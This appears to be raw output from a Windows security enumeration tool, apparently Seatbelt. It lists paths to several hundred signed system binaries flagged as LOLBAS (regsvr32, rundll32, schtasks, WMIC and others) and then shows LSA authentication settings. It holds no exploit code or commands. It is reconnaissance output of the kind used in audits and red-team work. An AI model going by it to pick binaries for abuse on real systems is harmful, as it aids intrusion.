Path: C:\Windows\WinSxS\wow64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.1697_none_4bf856a1e21a3382\regedit.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.1_none_ef49499c6862d48e\regedit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.1697_none_41a3ac4fadb97187\f\regedit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.1697_none_41a3ac4fadb97187\r\regedit.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.1697_none_4bf856a1e21a3382\f\regedit.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.1697_none_4bf856a1e21a3382\r\regedit.exe
Path: C:\Windows\System32\regini.exe
Path: C:\Windows\SysWOW64\regini.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-regini_31bf3856ad364e35_10.0.17763.1_none_fd1c265411fa4f7a\regini.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-regini_31bf3856ad364e35_10.0.17763.1_none_0770d0a6465b1175\regini.exe
Path: C:\Windows\System32\Register-CimProvider.exe
Path: C:\Windows\SysWOW64\Register-CimProvider.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..ter-cimprovider-exe_31bf3856ad364e35_10.0.17763.1_none_540f87ef441f7cc7\Register-CimProvider.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..ter-cimprovider-exe_31bf3856ad364e35_10.0.17763.1_none_5e64324178803ec2\Register-CimProvider.exe
Path: C:\Windows\WinSxS\amd64_regsvcs_b03f5f7f11d50a3a_4.0.15713.0_none_434c448b55fc927a\RegSvcs.exe
Path: C:\Windows\WinSxS\x86_regsvcs_b03f5f7f11d50a3a_4.0.15713.0_none_8af97b626a78bb80\RegSvcs.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe
Path: C:\Windows\System32\regsvr32.exe
Path: C:\Windows\SysWOW64\regsvr32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-regsvr32_31bf3856ad364e35_10.0.17763.1_none_691d073687ad042e\regsvr32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-regsvr32_31bf3856ad364e35_10.0.17763.1_none_7371b188bc0dc629\regsvr32.exe
Path: C:\Windows\System32\replace.exe
Path: C:\Windows\SysWOW64\replace.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.17763.1_none_6de2d78cbf7e0077\replace.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.17763.1_none_783781def3dec272\replace.exe
Path: C:\Windows\System32\RpcPing.exe
Path: C:\Windows\SysWOW64\RpcPing.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.1911_none_eb071b9712b83e1d\RpcPing.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.1_none_8e7ff7f598e1efd4\RpcPing.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.1911_none_f55bc5e947190018\RpcPing.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.1_none_98d4a247cd42b1cf\RpcPing.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.1911_none_eb071b9712b83e1d\f\RpcPing.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.1911_none_eb071b9712b83e1d\r\RpcPing.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.1911_none_f55bc5e947190018\f\RpcPing.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.1911_none_f55bc5e947190018\r\RpcPing.exe
Path: C:\Windows\System32\rundll32.exe
Path: C:\Windows\SysWOW64\rundll32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.17763.1697_none_257a487a7ccb5dd4\rundll32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.17763.1_none_c8cb3b750313fee0\rundll32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.17763.1697_none_2fcef2ccb12c1fcf\rundll32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.17763.1_none_d31fe5c73774c0db\rundll32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.17763.1697_none_257a487a7ccb5dd4\f\rundll32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.17763.1697_none_257a487a7ccb5dd4\r\rundll32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.17763.1697_none_2fcef2ccb12c1fcf\f\rundll32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.17763.1697_none_2fcef2ccb12c1fcf\r\rundll32.exe
Path: C:\Windows\System32\runonce.exe
Path: C:\Windows\SysWOW64\runonce.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-runonce_31bf3856ad364e35_10.0.17763.1697_none_632fcb8790e8bcf0\runonce.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-runonce_31bf3856ad364e35_10.0.17763.1_none_0680be8217315dfc\runonce.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-runonce_31bf3856ad364e35_10.0.17763.1697_none_6d8475d9c5497eeb\runonce.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-runonce_31bf3856ad364e35_10.0.17763.1_none_10d568d44b921ff7\runonce.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-runonce_31bf3856ad364e35_10.0.17763.1697_none_632fcb8790e8bcf0\f\runonce.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-runonce_31bf3856ad364e35_10.0.17763.1697_none_632fcb8790e8bcf0\r\runonce.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-runonce_31bf3856ad364e35_10.0.17763.1697_none_6d8475d9c5497eeb\f\runonce.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-runonce_31bf3856ad364e35_10.0.17763.1697_none_6d8475d9c5497eeb\r\runonce.exe
Path: C:\Windows\System32\sc.exe
Path: C:\Windows\SysWOW64\sc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..llercommandlinetool_31bf3856ad364e35_10.0.17763.1_none_653424fe2cd61e8c\sc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-s..llercommandlinetool_31bf3856ad364e35_10.0.17763.1_none_6f88cf506136e087\sc.exe
Path: C:\Windows\System32\schtasks.exe
Path: C:\Windows\SysWOW64\schtasks.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.17763.1852_none_d79b3f66874a77d1\schtasks.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.17763.1_none_7b0561790d7fc67c\schtasks.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.17763.1852_none_e1efe9b8bbab39cc\schtasks.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.17763.1_none_855a0bcb41e08877\schtasks.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.17763.1852_none_d79b3f66874a77d1\f\schtasks.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.17763.1852_none_d79b3f66874a77d1\r\schtasks.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.17763.1852_none_e1efe9b8bbab39cc\f\schtasks.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.17763.1852_none_e1efe9b8bbab39cc\r\schtasks.exe
Path: C:\Windows\System32\ScriptRunner.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.1_none_bd38610020506813\ScriptRunner.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.6054_none_1a249a3b99da5ee5\ScriptRunner.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.6054_none_1a249a3b99da5ee5\f\ScriptRunner.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.6054_none_1a249a3b99da5ee5\r\ScriptRunner.exe
Path: C:\Windows\System32\setupapi.dll
Path: C:\Windows\SysWOW64\setupapi.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.1_none_25bb43961e674651\setupapi.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.5830_none_824f561798338652\setupapi.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.1_none_300fede852c8084c\setupapi.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.5830_none_8ca40069cc94484d\setupapi.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.5830_none_824f561798338652\f\setupapi.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.5830_none_824f561798338652\r\setupapi.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.5830_none_8ca40069cc94484d\f\setupapi.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.5830_none_8ca40069cc94484d\r\setupapi.dll
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-onecore-reverseforwarders_31bf3856ad364e35_10.0.17763.6292_none_efe5a0203e79a3b1\f\setupapi.dll
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-onecore-reverseforwarders_31bf3856ad364e35_10.0.17763.6292_none_efe5a0203e79a3b1\r\setupapi.dll
Path: C:\Windows\System32\shdocvw.dll
Path: C:\Windows\SysWOW64\shdocvw.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.17763.1_none_d83ad76a640f99cc\shdocvw.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.17763.4720_none_34d8b7a7ddd4a75e\shdocvw.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.17763.1_none_e28f81bc98705bc7\shdocvw.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.17763.4720_none_3f2d61fa12356959\shdocvw.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.17763.4720_none_34d8b7a7ddd4a75e\f\shdocvw.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.17763.4720_none_34d8b7a7ddd4a75e\r\shdocvw.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.17763.4720_none_3f2d61fa12356959\f\shdocvw.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.17763.4720_none_3f2d61fa12356959\r\shdocvw.dll
Path: C:\Windows\System32\shell32.dll
Path: C:\Windows\SysWOW64\shell32.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.17763.6292_none_b9c9dcdee3bbba89\shell32.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.17763.6292_none_c41e8731181c7c84\shell32.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.17763.6292_none_b9c9dcdee3bbba89\f\shell32.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.17763.6292_none_b9c9dcdee3bbba89\r\shell32.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.17763.6292_none_c41e8731181c7c84\f\shell32.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.17763.6292_none_c41e8731181c7c84\r\shell32.dll
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-onecore-reverseforwarders_31bf3856ad364e35_10.0.17763.6292_none_efe5a0203e79a3b1\f\shell32.dll
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-onecore-reverseforwarders_31bf3856ad364e35_10.0.17763.6292_none_efe5a0203e79a3b1\r\shell32.dll
Path: C:\Windows\System32\slmgr.vbs
Path: C:\Windows\SysWOW64\slmgr.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.17763.1_none_365f30041749ca42\slmgr.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.17763.5830_none_92f3428591160a43\slmgr.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.17763.1_none_40b3da564baa8c3d\slmgr.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.17763.5830_none_9d47ecd7c576cc3e\slmgr.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.17763.5830_none_92f3428591160a43\f\slmgr.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.17763.5830_none_92f3428591160a43\r\slmgr.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.17763.5830_none_9d47ecd7c576cc3e\f\slmgr.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.17763.5830_none_9d47ecd7c576cc3e\r\slmgr.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-wid_31bf3856ad364e35_10.0.17763.1_none_9870f12fb40ec83a\SqlDumper.exe
Path: C:\Program Files\Microsoft SQL Server\130\Shared\SqlDumper.exe
Path: C:\Program Files\Microsoft SQL Server\140\Shared\SqlDumper.exe
Path: C:\Program Files (x86)\Microsoft SQL Server\140\Shared\SqlDumper.exe
Path: C:\Program Files\Microsoft Analysis Services\AS OLEDB\140\SQLDumper.exe
Path: C:\Program Files (x86)\Microsoft Analysis Services\AS OLEDB\130\SQLDumper.exe
Path: C:\Program Files (x86)\Microsoft Analysis Services\AS OLEDB\140\SQLDumper.exe
Path: C:\Program Files (x86)\Microsoft SQL Server\140\Tools\Binn\SQLPS.exe
Path: C:\Windows\System32\SyncAppvPublishingServer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.1_none_bd38610020506813\SyncAppvPublishingServer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.6054_none_1a249a3b99da5ee5\SyncAppvPublishingServer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.6054_none_1a249a3b99da5ee5\f\SyncAppvPublishingServer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.6054_none_1a249a3b99da5ee5\r\SyncAppvPublishingServer.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.6054_none_1a249a3b99da5ee5\f\syncappvpublishingserver.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.6054_none_1a249a3b99da5ee5\r\syncappvpublishingserver.vbs
Path: C:\Windows\System32\SyncAppvPublishingServer.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.1_none_bd38610020506813\SyncAppvPublishingServer.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.6054_none_1a249a3b99da5ee5\SyncAppvPublishingServer.vbs
Path: C:\Windows\System32\syssetup.dll
Path: C:\Windows\SysWOW64\syssetup.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-syssetup_31bf3856ad364e35_10.0.17763.1_none_619675b2efe03756\syssetup.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-syssetup_31bf3856ad364e35_10.0.17763.1_none_6beb20052440f951\syssetup.dll
Path: C:\Windows\System32\tttracer.exe
Path: C:\Windows\SysWOW64\tttracer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.17763.1_none_5529f3f1661c1b19\tttracer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.17763.2989_none_b1b7653edfece4f2\tttracer.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.17763.1_none_5f7e9e439a7cdd14\tttracer.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.17763.2989_none_bc0c0f91144da6ed\tttracer.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.17763.2989_none_b1b7653edfece4f2\f\tttracer.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.17763.2989_none_b1b7653edfece4f2\r\tttracer.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.17763.2989_none_bc0c0f91144da6ed\f\tttracer.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.17763.2989_none_bc0c0f91144da6ed\r\tttracer.exe
Path: C:\Windows\System32\url.dll
Path: C:\Windows\SysWOW64\url.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-winsockautodialstub_31bf3856ad364e35_11.0.17763.1_none_14e2360420cdaa63\url.dll
Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-winsockautodialstub_31bf3856ad364e35_11.0.17763.1_none_b8c39a806870392d\url.dll
Path: C:\Windows\WinSxS\amd64_netfx-vb_compiler_b03f5f7f11d50a3a_10.0.17763.17801_none_b58a806f7ca249b0\vbc.exe
Path: C:\Windows\WinSxS\amd64_netfx35linq-vb_compiler_orcas_31bf3856ad364e35_10.0.17763.17801_none_204d503865f7ef36\vbc.exe
Path: C:\Windows\WinSxS\amd64_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15713.0_none_950557bc0844e513\vbc.exe
Path: C:\Windows\WinSxS\amd64_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15713.1000_none_a662d1c8d33fa842\vbc.exe
Path: C:\Windows\WinSxS\x86_netfx-vb_compiler_b03f5f7f11d50a3a_10.0.17763.17801_none_fd37b746911e72b6\vbc.exe
Path: C:\Windows\WinSxS\x86_netfx35linq-vb_compiler_orcas_31bf3856ad364e35_10.0.17763.17801_none_c42eb4b4ad9a7e00\vbc.exe
Path: C:\Windows\WinSxS\x86_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15713.0_none_dcb28e931cc10e19\vbc.exe
Path: C:\Windows\WinSxS\x86_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15713.1000_none_ee10089fe7bbd148\vbc.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\vbc.exe
Path: C:\Windows\System32\verclsid.exe
Path: C:\Windows\SysWOW64\verclsid.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-verclsid_31bf3856ad364e35_10.0.17763.1_none_acacbb1b6b9db81c\verclsid.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-verclsid_31bf3856ad364e35_10.0.17763.1_none_b701656d9ffe7a17\verclsid.exe
Path: C:\Program Files\Windows Mail\wab.exe
Path: C:\Program Files (x86)\Windows Mail\wab.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-wab-app_31bf3856ad364e35_10.0.17763.1_none_336f47662fbc0a5e\wab.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-wab-app_31bf3856ad364e35_10.0.17763.1_none_3dc3f1b8641ccc59\wab.exe
Path: C:\Windows\System32\winrm.vbs
Path: C:\Windows\SysWOW64\winrm.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.17763.1_none_bb2b5f4505313851\winrm.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.17763.5830_none_17bf71c67efd7852\winrm.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.17763.1_none_c58009973991fa4c\winrm.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.17763.5830_none_22141c18b35e3a4d\winrm.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.17763.5830_none_17bf71c67efd7852\f\winrm.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.17763.5830_none_17bf71c67efd7852\r\winrm.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.17763.5830_none_22141c18b35e3a4d\f\winrm.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.17763.5830_none_22141c18b35e3a4d\r\winrm.vbs
Path: C:\Windows\System32\wbem\WMIC.exe
Path: C:\Windows\SysWOW64\wbem\WMIC.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..ommand-line-utility_31bf3856ad364e35_10.0.17763.1_none_926fbf4425005e17\WMIC.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..ommand-line-utility_31bf3856ad364e35_10.0.17763.1_none_9cc4699659612012\WMIC.exe
Path: C:\Windows\System32\wscript.exe
Path: C:\Windows\SysWOW64\wscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.1_none_392e3cfb58835d77\wscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_961a7636d20d5449\wscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.1_none_4382e74d8ce41f72\wscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_a06f2089066e1644\wscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_961a7636d20d5449\f\wscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_961a7636d20d5449\r\wscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_a06f2089066e1644\f\wscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_a06f2089066e1644\r\wscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17763.1_none_73b46e4327098ae1\wsl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17763.2989_none_d041df90a0da54ba\wsl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17763.2989_none_d041df90a0da54ba\f\wsl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17763.2989_none_d041df90a0da54ba\r\wsl.exe
Path: C:\Windows\System32\WSReset.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.17763.1697_none_13ecf0e2d7e2daa0\WSReset.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.17763.1_none_b73de3dd5e2b7bac\WSReset.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.17763.1697_none_13ecf0e2d7e2daa0\f\WSReset.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.17763.1697_none_13ecf0e2d7e2daa0\r\WSReset.exe
Path: C:\Windows\System32\xwizard.exe
Path: C:\Windows\SysWOW64\xwizard.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-xwizard-host-process_31bf3856ad364e35_10.0.17763.1_none_49b9fab890ad567c\xwizard.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-xwizard-host-process_31bf3856ad364e35_10.0.17763.1_none_540ea50ac50e1877\xwizard.exe
Path: C:\Windows\System32\zipfldr.dll
Path: C:\Windows\SysWOW64\zipfldr.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.17763.4974_none_c5591ad907431d42\zipfldr.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.17763.4974_none_cfadc52b3ba3df3d\zipfldr.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.17763.4974_none_c5591ad907431d42\f\zipfldr.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.17763.4974_none_c5591ad907431d42\r\zipfldr.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.17763.4974_none_cfadc52b3ba3df3d\f\zipfldr.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.17763.4974_none_cfadc52b3ba3df3d\r\zipfldr.dll
Found: 719 LOLBAS

To see how to use the LOLBAS that were found go to https://lolbas-project.github.io/
====== LSASettings ======

  auditbasedirectories           : 0
  auditbaseobjects               : 0
  Bounds                         : 00-30-00-00-00-20-00-00
  crashonauditfail               : 0
  fullprivilegeauditing          : 00
  LimitBlankPasswordUse          : 1
  NoLmHash                       : 1
  Security Packages              : ""
  Notification Packages          : rassfm,scecli
  Authentication Packages        : msv1_0
  disabledomaincreds             : 0
  everyoneincludesanonymous      : 0
  forceguest                     : 0
  LsaPid                         : 736
  ProductType                    : 7
  restrictanonymous              : 0
  restrictanonymoussam           : 1
  SecureBoot                     : 1
  LsaCfgFlagsDefault             : 0
====== MappedDrives ======

Mapped Drives (via WMI)

====== McAfeeConfigs ======

====== McAfeeSiteList ======

ERROR:   [!] Terminating exception running command 'McAfeeSiteList': System.NullReferenceException: Object reference not set to an instance of an object.
